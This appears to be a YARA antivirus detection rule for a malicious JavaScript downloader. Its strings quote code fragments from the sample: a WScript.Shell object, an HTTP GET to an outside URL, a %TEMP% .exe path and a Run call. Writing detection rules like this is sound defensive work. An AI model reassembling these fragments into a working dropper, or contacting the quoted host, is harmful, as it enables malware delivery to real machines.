rule sig_20160328_13efbf6eb901fd30bc38b3f42391220e {
  meta:
    description = "datamaliciousorder - file 20160328_13efbf6eb901fd30bc38b3f42391220e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0d1a2217cdf1cc684ebcc4f658bc77ef1c11f6a80036e506bc7304fe3552aa2d"

  strings:
    $s1  = "function Nugpoy() {return Nmeaqabfz[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"m2jIW88vavF.exe\";};" fullword ascii
    $s2  = "Zwqqurjhga[Fmvdcyeoc](\"GET\", \"http://www.suansawanresort.com/n7eua\", false);" fullword ascii
    $s3  = "do {WScript[Wqlkkc](Ffmhinstx() * 11)} while (Zwqqurjhga[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Nmeaqabfz = function Zrshdnovpr() {return WScript[Cslguzdqjq](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Tujljsz(Grggan, Bhfcmuhw){return Grggan - Bhfcmuhw;};" fullword ascii
    $s6  = "function Evkiv(Sfynycf){Nmeaqabfz[\"Run\"](Sfynycf, Uqivjio, Uqivjio);};" fullword ascii
    $s7  = "function Cnbmv() {return ((Fcjkfft == true) && (Fcjkfft == Nteykoq)) ? 1 : Uqivjio;};" fullword ascii
    $s8  = " while (Sqhiazokmf){" fullword ascii
    $s9  = "Fcjkfft = true; " fullword ascii
    $s10 = "function Tbjhmawqc(Wuzpslt) {var Nohgw = (1, 2, 3, 4, 5, Wuzpslt); return Nohgw;};" fullword ascii
    $s11 = "Nteykoq = true; " fullword ascii
    $s12 = "var Fixbhfe = new this[\"Date\"]();" fullword ascii
    $s13 = "var Nteykoq = false;" fullword ascii
    $s14 = "var Fbgxgjjnbk = false;" fullword ascii
    $s15 = "function Ffmhinstx(){return 22;};" fullword ascii
    $s16 = "function Dyecyougz()" fullword ascii
    $s17 = "return Tujljsz(Hbtcklpmm, Pztlh);" fullword ascii
    $s18 = "function Cdtvrjrh(){return Cslguzdqjq;};" fullword ascii
    $s19 = "var Fcjkfft = false;" fullword ascii
    $s20 = "function Rjxavcb(){return Dphdogtyqq;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}